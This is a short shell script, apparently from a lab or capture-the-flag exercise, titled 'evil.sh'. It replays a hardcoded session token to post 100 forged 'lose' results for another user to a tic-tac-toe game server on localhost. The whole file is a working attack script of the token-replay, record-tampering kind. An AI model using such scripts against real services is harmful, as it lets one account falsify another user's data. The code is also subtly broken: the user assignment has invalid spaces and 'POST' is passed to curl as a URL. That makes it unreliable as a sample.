#!/bin/sh
#
#evil.sh - Add 100 losses to an user!

user = "user2"
num=100
result="lose"
tictacsession="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIyIiwiaWF0IjoxNzQ5NTc3NjYzLCJleHAiOjE3NDk1ODEyNjN9.7DX-Tqya-4duk9uyPFA_Mi6ximhjZ1v4R4j5qifoeTw"

for i in `seq 1 $num`; do
	curl -s 'POST' -b "tictacsession=$tictacsession" 'http://localhost.:10005/game' --data-binary "user=$user&result=$result"
done

